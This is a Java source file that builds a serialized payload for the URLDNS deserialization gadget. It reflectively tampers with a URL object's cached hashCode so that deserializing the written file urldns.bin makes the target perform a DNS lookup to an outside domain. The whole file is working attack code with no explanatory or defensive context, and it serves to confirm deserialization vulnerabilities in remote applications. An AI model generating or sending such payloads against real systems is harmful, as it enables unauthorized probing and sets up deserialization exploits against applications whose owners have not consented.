import java.io.*;
import java.util.*;
import java.net.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Dns {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL url = new URL("http://dndndnds.sapo.shk0x.net/");
		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);

		f.set(url, 0x01010101);
		hashMap.put(url, 0);
		f.set(url, -1);

		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
		oos.writeObject(hashMap);
		//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.bin"));
		//ois.readObject();
	}

}
